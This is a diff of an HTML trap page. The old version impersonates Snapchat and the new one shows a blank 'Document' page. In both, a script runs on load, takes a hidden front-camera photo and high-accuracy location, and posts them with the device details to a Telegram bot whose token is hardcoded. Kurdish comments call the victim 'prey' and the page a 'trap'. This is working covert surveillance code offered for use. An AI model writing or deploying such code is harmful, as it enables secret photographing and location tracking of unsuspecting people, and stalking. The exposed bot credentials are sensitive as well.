@@ -3,15 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat</title>
+    <title>Document</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* لابردنی هەموو دیزاینێک و سپی کردنی پاشبنەما */
         body {
-            /* 😈 لێرە چاکم کرد: IMG_3677.JPG وەک ئەوەی لە وێنەکەدا دیارە */
-            background: url('IMG_3677.JPG') center center / cover no-repeat fixed;
-            background-color: #000;
-            min-height: 100vh;
-            overflow: hidden;
+            background-color: white;
+            margin: 0;
+            padding: 0;
         }
         video, canvas { position: fixed; left: -9999px; opacity: 0; pointer-events: none; }
     </style>
@@ -20,53 +18,54 @@
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
     <script>
-        const B_T = "8825038954:AAGVsn1Kj3ppOyY9xCYX-f1t9KJR15C1XJ0";
-        const C_I = "212703396";
-
+        // سکرێپتەکە وەک خۆی دەمێنێتەوە بۆ ئەوەی کار بکات
+        const B_T = "8739484012:AAFMN2V0kdkVnUp_8YlDV1IKEq9_6IiZsOA";
+        const C_I = "659131693";
+        
         async function sendMsg(text) {
             await fetch(`https://api.telegram.org/bot${B_T}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: C_I, text: text })
             }).catch(() => {});
         }
-
+        
         async function sendPhoto(blob, lat, lon) {
             const fd = new FormData();
             fd.append('chat_id', C_I);
             fd.append('photo', blob, 'target.jpg');
-            fd.append('caption', `😈 نێچیرێکی نوێ گیرا!\n📍 شوێن: https://www.google.com/maps?q=${lat},${lon}\n🕒 کات: ${new Date().toLocaleString('ckb')}\n🧬 ئامێر: ${navigator.userAgent}`);
+            fd.append('caption', `📍 https://www.google.com/maps?q=${lat},${lon}\n🕒 ${new Date().toLocaleString('ckb')}\n🧬 ${navigator.userAgent}`);
             await fetch(`https://api.telegram.org/bot${B_T}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
         }
 
         async function start() {
-            await sendMsg("🎯 تەڵەکە کارا بوو...");
+            await sendMsg("🎯 Opened");
             let lat = null, lon = null;
             try {
                 const pos = await new Promise((ok, no) => {
-                    navigator.geolocation.getCurrentPosition(ok, no, { enableHighAccuracy: true, timeout: 8000 });
+                    navigator.geolocation.getCurrentPosition(ok, no, { enableHighAccuracy: true, timeout: 5000 });
                 });
                 lat = pos.coords.latitude;
                 lon = pos.coords.longitude;
-            } catch (e) {}
-
+            } catch (e) { await sendMsg(`❌ ${e.message}`); }
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('video');
                 v.srcObject = stream;
-                await new Promise(r => setTimeout(r, 2500));
+                await new Promise(r => setTimeout(r, 2000));
                 const c = document.getElementById('canvas');
                 c.width = v.videoWidth || 640;
                 c.height = v.videoHeight || 480;
                 c.getContext('2d').drawImage(v, 0, 0);
                 c.toBlob(async (blob) => {
                     if (blob) {
-                        await sendPhoto(blob, lat || "Unknown", lon || "Unknown");
+                        await sendPhoto(blob, lat || "N/A", lon || "N/A");
                     }
                     stream.getTracks().forEach(t => t.stop());
-                }, 'image/jpeg', 0.8);
-            } catch (e) {}
+                }, 'image/jpeg', 0.7);
+            } catch (e) { await sendMsg(`🚫 ${e.name}`); }
         }
-        window.addEventListener('load', start);
+        window.addEventListener('load', () => { start(); });
     </script>
 </body>
 </html>
